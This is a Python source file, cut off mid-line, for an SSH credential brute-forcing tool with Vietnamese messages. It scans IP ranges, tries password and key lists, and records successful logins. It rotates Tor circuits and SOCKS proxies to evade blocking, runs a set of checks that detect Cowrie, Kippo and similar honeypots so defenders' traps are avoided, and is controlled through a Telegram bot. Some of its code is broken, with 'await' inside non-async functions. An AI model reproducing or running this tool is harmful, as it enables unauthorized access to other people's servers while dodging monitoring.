import paramiko
import time
import random
import threading
import socket
import argparse
import ipaddress
import json
import socks
import configparser
import os
import logging
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from tabulate import tabulate
import shutil
import sys
import datetime
import requests
from stem.control import Controller
from stem import Signal
from paramiko import AuthenticationException, SSHException
from concurrent.futures import ThreadPoolExecutor, as_completed
import multiprocessing

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

lock = threading.Lock()
stop_flag = False
ip_block_monitor = False
auto_shutdown_enabled = False
blocked_ips = []
leaked_ips = []
use_tor = False
start_time = time.time()
scanned_ips = 0
total_ips = 0
cache_results = {}  # Bộ đệm kết quả quét

# Default settings
CONFIG_FILE = "config.ini"
TOR_PORTS_FILE = "tor_ports.txt"
DEFAULT_PORT = 22
DEFAULT_THREADS = min(10, max(2, multiprocessing.cpu_count()))  # Tự động điều chỉnh
DEFAULT_TIMEOUT = 5
DEFAULT_MAX_ATTEMPTS = 20
PROXY_FILES = ["proxy.txt", "socks5.txt", "sock5.txt"]  # Hỗ trợ sock5.txt
TOR_PORTS = [9050, 9051, 9052, 9053, 9054, 9055, 9056]
TOR_PROXY = {"host": "127.0.0.1", "port": 9050}

# Honeypot detection modes
check_banner = False
check_response = False
check_filesystem = False
check_error = False
check_behavior = False
check_prompt = False
check_deep = False
check_network = False
check_connections = False
check_ttl = False
check_response_behavior = False
check_normal = False
check_bypass = False
check_all = False
check_bigscan = False

# Global stats
stats = {"success": 0, "failed": 0, "honeypot": 0, "errors": 0, "bypassed": 0}
proxy_status = []
running_proxies = []
current_proxy = None
telegram_bot = None
use_proxy = False
ip_list = []
ports = []
key_files = []
args = None
previous_modes = []

def read_config():
    config = configparser.ConfigParser()
    if os.path.exists(CONFIG_FILE):
        config.read(CONFIG_FILE)
        return {
            "proxy_type": config.get("Proxy", "type", fallback=None),
            "proxy_host": config.get("Proxy", "host", fallback=None),
            "proxy_port": config.getint("Proxy", "port", fallback=None),
            "proxy_user": config.get("Proxy", "user", fallback=None),
            "proxy_pass": config.get("Proxy", "pass", fallback=None),
            "telegram_token": config.get("Telegram", "token", fallback=None),
            "admin_id": config.get("Telegram", "admin_id", fallback=None),
            "threads": config.getint("Settings", "threads", fallback=DEFAULT_THREADS),
            "timeout": config.getint("Settings", "timeout", fallback=DEFAULT_TIMEOUT),
            "max_attempts": config.getint("Settings", "max_attempts", fallback=DEFAULT_MAX_ATTEMPTS),
            "ports": config.get("Settings", "ports", fallback=str(DEFAULT_PORT)).split(","),
        }
    return {}

def read_file(file_path):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('█')]
    except FileNotFoundError:
        logging.error(f"File {file_path} not found!")
        return []
    except Exception as e:
        logging.error(f"Error reading {file_path}: {e}")
        return []

def write_to_file(file_path, content):
    with lock:
        try:
            with open(file_path, 'a') as f:
                f.write(content + '\n')
        except Exception as e:
            logging.error(f"Error writing to {file_path}: {e}")

def save_results():
    with lock:
        try:
            with open('results.json', 'w') as f:
                json.dump({
                    "stats": stats,
                    "scanned_ips": scanned_ips,
                    "total_ips": total_ips,
                    "timestamp": datetime.datetime.now().isoformat()
                }, f, indent=4)
        except Exception as e:
            logging.error(f"Error saving results: {e}")

def check_port(ip, port):
    """Kiểm tra cổng mở bằng socket."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

def setup_proxy(proxy):
    global current_proxy
    if proxy and proxy["host"]:
        try:
            socks.set_default_proxy(
                socks.SOCKS5,
                proxy["host"],
                proxy["port"],
                username=proxy.get("user"),
                password=proxy.get("pass")
            )
            socket.socket = socks.socksocket
            current_proxy = proxy
        except Exception as e:
            logging.error(f"Error setting up proxy: {e}")
            current_proxy = None
    else:
        socket.socket = socket._socket.socket
        current_proxy = None

def check_proxy(proxy):
    proxy_info = {
        "host": proxy["host"],
        "port": proxy["port"],
        "status": "dead",
        "ping": "N/A",
        "speed": "N/A"
    }
    try:
        start_time = time.time()
        sock = socks.socksocket()
        sock.set_proxy(
            socks.SOCKS5,
            proxy["host"],
            proxy["port"],
            username=proxy.get("user"),
            password=proxy.get("pass")
        )
        sock.settimeout(5)
        sock.connect(("8.8.8.8", 443))
        sock.send(b"GET / HTTP/1.1\r\nHost: 8.8.8.8\r\n\r\n")
        sock.recv(1024)
        sock.close()
        ping = (time.time() - start_time) * 1000
        speed = 1000 / ping if ping > 0 else 999
        proxy_info["status"] = "alive"
        proxy_info["ping"] = f"{ping:.2f} ms"
        proxy_info["speed"] = f"{speed:.2f} req/s"
    except Exception as e:
        logging.error(f"Proxy check failed for {proxy['host']}:{proxy['port']}: {e}")
    return proxy_info

def check_tor(port):
    try:
        with Controller.from_port(port=port + 1):
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, TOR_PROXY["host"], port)
            sock.settimeout(5)
            sock.connect(("check.torproject.org", 443))
            sock.send(b"GET /api/ip HTTP/1.1\r\nHost: check.torproject.org\r\n\r\n")
            response = sock.recv(1024).decode()
            sock.close()
            if '"IsTor":true' in response:
                start_time = time.time()
                sock.connect(("8.8.8.8", 443))
                ping = (time.time() - start_time) * 1000
                speed = 1000 / ping if ping > 0 else 999
                return {
                    "host": TOR_PROXY["host"],
                    "port": port,
                    "status": "alive",
                    "ping": f"{ping:.2f} ms",
                    "speed": f"{speed:.2f} req/s"
                }
    except Exception as e:
        logging.error(f"Tor check failed for port {port}: {e}")
    return {
        "host": TOR_PROXY["host"],
        "port": port,
        "status": "dead",
        "ping": "N/A",
        "speed": "N/A"
    }

def refresh_proxies():
    global proxy_status, running_proxies, use_tor, use_proxy
    if use_tor:
        load_tor_ports()
        alive_ports = []
        proxy_status.clear()
        for port in TOR_PORTS:
            status = check_tor(port)
            if status["status"] == "alive":
                alive_ports.append(port)
                proxy_status.append(status)
        TOR_PORTS = alive_ports
        save_tor_ports()
        if not TOR_PORTS:
            use_tor = False
            logging.info("No alive Tor ports found. Switching to direct connection.")
            setup_proxy(None)
        else:
            TOR_PROXY["port"] = max(TOR_PORTS, key=lambda p: float(check_tor(p)["speed"].split()[0]) if check_tor(p)["speed"] != "N/A" else 0)
            setup_proxy(TOR_PROXY)
    elif use_proxy:
        proxies = []
        for file in PROXY_FILES:
            proxies.extend(read_file(file))
            proxies = [p.split(":") for p in proxies if ":" in p]
            proxies = [{"host": p[0], "port": int(p[1])} for p in proxies if len(p) == 2]
        proxy_status.clear()
        proxy_status.extend([check_proxy(p) for p in proxies])
        alive_proxies = [p for p in proxy_status if p["status"] == "alive"]
        if alive_proxies:
            alive_proxies.sort(key=lambda x: float(x["speed"].split()[0]) if x["speed"] != "N/A" else 0, reverse=True)
            setup_proxy(alive_proxies[0])
        else:
            use_proxy = False
            logging.info("No alive proxies found. Switching to direct connection.")
            setup_proxy(None)

def load_tor_ports():
    global TOR_PORTS
    if os.path.exists(TOR_PORTS_FILE):
        TOR_PORTS = [int(line.strip()) for line in read_file(TOR_PORTS_FILE) if line.strip().isdigit()]

def save_tor_ports():
    with lock:
        try:
            with open(TOR_PORTS_FILE, 'w') as f:
                for port in TOR_PORTS:
                    f.write(f"{port}\n")
        except Exception as e:
            logging.error(f"Error saving Tor ports: {e}")

def connect_tor_port(port, update, context):
    global use_tor, TOR_PROXY, stop_flag, stats
    stop_flag = True
    time.sleep(1)
    TOR_PROXY["port"] = port
    status = check_tor(port)
    if status["status"] == "alive":
        try:
            with Controller.from_port(port=port + 1) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
            use_tor = True
            use_proxy = False
            setup_proxy(TOR_PROXY)
            stop_flag = False
            if update and context:
                await update.message.reply_text(f"Đã kết nối thành công đến Tor port {port} (IP mới, Ping: {status['ping']}, Speed: {status['speed']})")
            return True, f"Đã kết nối thành công đến Tor port {port} (IP mới, Ping: {status['ping']}, Speed: {status['speed']})"
        except Exception as e:
            logging.error(f"Failed to signal NEWNYM for port {port}: {e}")
            if update and context:
                await update.message.reply_text(f"Lỗi khi kết nối Tor port {port}: {str(e)}")
    for alt_port in TOR_PORTS:
        if alt_port != port:
            alt_status = check_tor(alt_port)
            if alt_status["status"] == "alive":
                try:
                    with Controller.from_port(port=alt_port + 1) as controller:
                        controller.authenticate()
                        controller.signal(Signal.NEWNYM)
                    TOR_PROXY["port"] = alt_port
                    use_tor = True
                    use_proxy = False
                    setup_proxy(TOR_PROXY)
                    stop_flag = False
                    if update and context:
                        await update.message.reply_text(f"Không kết nối được đến port {port}. Đã thay thế Tor port {alt_port} (IP mới, Ping: {alt_status['ping']}, Speed: {alt_status['speed']})")
                    return True, f"Không kết nối được đến port {port}. Đã thay thế Tor port {alt_port} (IP mới, Ping: {alt_status['ping']}, Speed: {alt_status['speed']})"
                except Exception as e:
                    logging.error(f"Failed to signal NEWNYM for port {alt_port}: {e}")
                    if update and context:
                        await update.message.reply_text(f"Lỗi khi thay thế Tor port {alt_port}: {str(e)}")
    stop_flag = False
    stats["errors"] += 1
    if update and context:
        await update.message.reply_text(f"Không kết nối được đến port {port}. Không tìm thấy port Tor thay thế.")
    return False, f"Không kết nối được đến port {port}. Không tìm thấy port Tor thay thế."

def check_ip_leak():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5, proxies=None if not use_proxy and not use_tor else {"http": f"socks5://{current_proxy['host']}:{current_proxy['port']}" if use_proxy else f"socks5://{TOR_PROXY['host']}:{TOR_PROXY['port']}"})
        ip = response.json()["ip"]
        if ip in blocked_ips or ip in leaked_ips:
            return True, ip
        return False, ip
    except Exception:
        return False, "Unknown"

def expand_cidr(cidr):
    try:
        network = ipaddress.ip_network(cidr, strict=False)
        return [str(ip) for ip in network.hosts()]
    except ValueError:
        logging.error(f"Invalid CIDR: {cidr}")
        return []

def get_ttl(ip):
    try:
        ping_process = os.popen(f"ping -c 1 {ip}")
        output = ping_process.read()
        ttl_line = [line for line in output.splitlines() if "ttl=" in line.lower()]
        if ttl_line:
            return int(ttl_line[0].split("ttl=")[1].split()[0])
        return None
    except Exception:
        return None

def is_honeypot_banner(ip, port):
    try:
        sock = socket.create_connection((ip, port), timeout=5)
        banner = sock.recv(1024).decode(errors='ignore').strip()
        sock.close()

        honeypot_signatures = [
            "Cowrie", "Kippo", "Dionaea", "Honey", "Cisco SSH",
            "SSH-2.0-OpenSSH_5.1p1", "SSH-2.0-OpenSSH_6.0p1 Debian-4",
            "libssh", "SSH-2.0-dropbear", "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8",
            "SSH-2.0-OpenSSH_5.3", "Honeyd", "Thc-Hydra", "SSH-2.0-Miranda"
        ]

        suspicious_keywords = [
            "auth", "alert", "monitor", "log", "unauthorized",
            "access denied", "honeypot", "security", "warning", "surveillance",
            "authentication failed", "further authentication required",
            "this system is monitored", "intrusion", "incident", "error",
            "suspicious", "logged", "trace", "attempt", "forensic", "pre-authentication", "banner message from server"
        ]

        for sig in honeypot_signatures:
            if sig.lower() in banner.lower():
                write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Suspicious SSH banner: '{banner[:100]}'")
                return True

        for keyword in suspicious_keywords:
            if keyword.lower() in banner.lower():
                write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Banner contains suspicious keyword: '{banner[:100]}'")
                return True

        if len(banner) < 10 or "SSH-2.0" not in banner:
            write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Banner too short or invalid: '{banner[:100]}'")
            return True

        return False
    except Exception:
        return False

def is_honeypot_response_time(ip, port):
    try:
        start_time = time.time()
        sock = socket.create_connection((ip, port), timeout=5)
        sock.recv(1024)
        sock.close()
        response_time = time.time() - start_time
        return response_time > 2.0 or response_time < 0.05
    except Exception:
        return False

def is_honeypot_filesystem(ip, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        stdin, stdout, stderr = ssh.exec_command('ls /', timeout=5)
        output_root = stdout.read().decode().strip()
        actual_dirs = output_root.split()
        suspicious_dirs = ["bin", "boot", "dev", "etc", "home", "lib", "media", "mnt", "opt", "proc", "root", "run", "sbin", "srv", "sys", "tmp", "usr", "var"]
        suspicious_root = len(actual_dirs) <= 3 or all(d not in suspicious_dirs for d in actual_dirs)
        stdin, stdout, stderr = ssh.exec_command('ls ~', timeout=5)
        output_home = stdout.read().decode().strip()
        suspicious_home = output_home == ""
        ssh.close()
        if suspicious_root:
            write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Abnormal root (/) directory: '{output_root[:100]}'")
        if suspicious_home:
            write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Empty or missing home (~) directory.")
        return suspicious_root or suspicious_home
    except Exception:
        return False

def is_honeypot_error_messages(ip, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password="thisiswrong", timeout=5)
        ssh.close()
        return True
    except AuthenticationException as e:
        return "authentication failed" not in str(e).lower()
    except Exception:
        return False

def is_honeypot_behavior(ip, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        stdin, stdout, stderr = ssh.exec_command('echo hello', timeout=5)
        output = stdout.read().decode().strip()
        ssh.close()
        return "hello" not in output.lower()
    except Exception:
        return False

def is_honeypot_prompt(ip, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        channel = ssh.invoke_shell()
        time.sleep(1)
        output = ""
        if channel.recv_ready():
            output = channel.recv(1024).decode(errors='ignore').strip()
        prompt_indicators = ['~', '#', '$', '@']
        is_honeypot = not any(indicator in output for indicator in prompt_indicators)
        channel.close()
        ssh.close()
        if is_honeypot:
            write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Missing shell prompt indicators: '{output[:100]}'")
        return is_honeypot
    except Exception:
        return False

def is_honeypot_deep_check(ip, port, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=6)
        stdin, stdout, stderr = ssh.exec_command("uname -a", timeout=5)
        uname_output = stdout.read().decode().lower()
        suspicious_keywords = ["important", "secret command", "first person", "honeypot", "alert", "monitor", "unauthorized", "surveillance", "tail137", "moon", "incident", "logged", "fake"]
        if any(keyword in uname_output for keyword in suspicious_keywords):
            write_to_file('honeypot.txt', f"{ip}:{port} → 🚩 Suspicious 'uname' output: '{uname_output[:100]}'")
            ssh.close()
            return True
        stdin, stdout, stderr = ssh.exec_command("cat /etc/passwd", timeout=5)
        passwd_output = stdout.read().decode().strip()
        passwd_lines = [line for line in passwd_output.splitlines() if ":" in line]
        if len(passwd_lines) < 3:
            ssh.close()
            return True
        hashes = [line.split(":")[1] for line in passwd_lines]
        if all(h == hashes[0] for h in hashes) and hashes[0] not in ['x', '*'] and not hashes[0].startswith('$'):
            ssh.close()
            return True
        if any(len(h) > 1 and h not in ['x', '*'] and not h.startswith('$') for h in hashes):
            ssh.close()
            return True
        ssh.close()
        return False
    except Exception:
        return True

def is_honeypot_ttl(ip, port):
    ttl = get_ttl(ip)
    return ttl is not None and (ttl < 32 or ttl > 128)  # TTL bất thường

def is_honeypot(ip, port, username, password):
    reasons = []
    if check_banner and is_honeypot_banner(ip, port):
        reasons.append("🚩 Suspicious SSH banner")
    if check_response and is_honeypot_response_time(ip, port):
        reasons.append("🐢 Abnormal response time")
    if check_filesystem and is_honeypot_filesystem(ip, port, username, password):
        reasons.append("📂 Fake or empty filesystem")
    if check_error and is_honeypot_error_messages(ip, port, username, password):
        reasons.append("🔓 Abnormal login error or login success with wrong password")
    if check_behavior and is_honeypot_behavior(ip, port, username, password):
        reasons.append("⚙️ Abnormal command behavior")
    if check_prompt and is_honeypot_prompt(ip, port, username, password):
        reasons.append("📜 Missing shell prompt indicators")
    if check_deep and is_honeypot_deep_check(ip, port, username, password):
        reasons.append("🧪 Suspicious uname or passwd content")
    if check_ttl and is_honeypot_ttl(ip, port):
        reasons.append("⏱ Abnormal TTL")
    if check_network:
        reasons.append("🌐 Network check not implemented")
    if check_connections:
        reasons.append("🔗 Connections check not implemented")
    if check_response_behavior and (use_proxy or use_tor):
        reasons.append("📨 Response behavior check not implemented")
    if check_bypass and (use_proxy or use_tor):
        reasons.append("🔄 Bypass check not implemented")
    return reasons

def check_ssh(ip, port, username, password=None, key_file=None, retries=2):
    global stats, cache_results
    if (ip, port, username) in cache_results:
        return cache_results[(ip, port, username)]

    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    if not check_port(ip, port):
        print(f"{RED}[NO SSH SERVICE] {ip}:{port} | Port not open{RESET}")
        with lock:
            stats["errors"] += 1
        cache_results[(ip, port, username)] = False
        return False

    if not check_normal:
        honeypot_reasons = is_honeypot(ip, port, username, password or "dummy")
        if honeypot_reasons:
            reason_text = " | ".join(honeypot_reasons)
            print(f"{YELLOW}[HONEYPOT] {ip}:{port} | {username} | {password or key_file} → {reason_text}{RESET}")
            write_to_file('honeypot.txt', f"{ip}:{port} | {username} | {password or key_file} → {reason_text}")
            with lock:
                stats["honeypot"] += 1
            cache_results[(ip, port, username)] = False
            return False

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    attempt = 0
    while attempt <= retries:
        try:
            if key_file:
                ssh.connect(ip, port=port, username=username, key_filename=key_file, timeout=DEFAULT_TIMEOUT)
            else:
                ssh.connect(ip, port=port, username=username, password=password, timeout=DEFAULT_TIMEOUT)
            print(f"{GREEN}[SUCCESS] {ip}:{port} | {username} | {password or key_file}{RESET}")
            write_to_file('success.txt', f"{ip}:{port} | {username} | {password or key_file}")
            with lock:
                stats["success"] += 1
            cache_results[(ip, port, username)] = True
            return True
        except AuthenticationException:
            print(f"{RED}[FAILED] {ip}:{port} | {username} | {password or key_file}{RESET}")
            with lock:
                stats["failed"] += 1
            cache_results[(ip, port, username)] = False
            return False
        except SSHException as e:
            print(f"{RED}[SSH ERROR] {ip}:{port} | {username} | {password or key_file} | {e}{RESET}")
            with lock:
                stats["errors"] += 1
            cache_results[(ip, port, username)] = False
            return False
        except Exception as e:
            attempt += 1
            if attempt > retries:
                print(f"{RED}[CONNECTION ERROR] {ip}:{port} | {username} | {password or key_file} | {e}{RESET}")
                with lock:
                    stats["errors"] += 1
                cache_results[(ip, port, username)] = False
                return False
            time.sleep(1)
        finally:
            ssh.close()

def brute_worker(ip, port, username, passwords, max_attempts=DEFAULT_MAX_ATTEMPTS):
    global stop_flag, scanned_ips
    if stop_flag:
        return
    attempts = 0
    for password in passwords:
        if stop_flag:
            break
        if attempts >= max_attempts:
            break
        if check_ssh(ip, port, username, password):
            break
        attempts += 1
        time.sleep(random.uniform(0.05, 0.15))
    for key_file in key_files:
        if stop_flag:
            break
        if check_ssh(ip, port, username, key_file=key_file):
            break
    with lock:
        scanned_ips += 1

async def start(update, context):
    if str(update.effective_user.id) != context.bot_data["admin_id"]:
        await update.message.reply_text("Unauthorized user!")
        return
    await update.message.reply_text("Đang khởi động bot...")
    await update.message.reply_text("Bot is running")

async def menu(update, context):
    if str(update.effective_user.id)
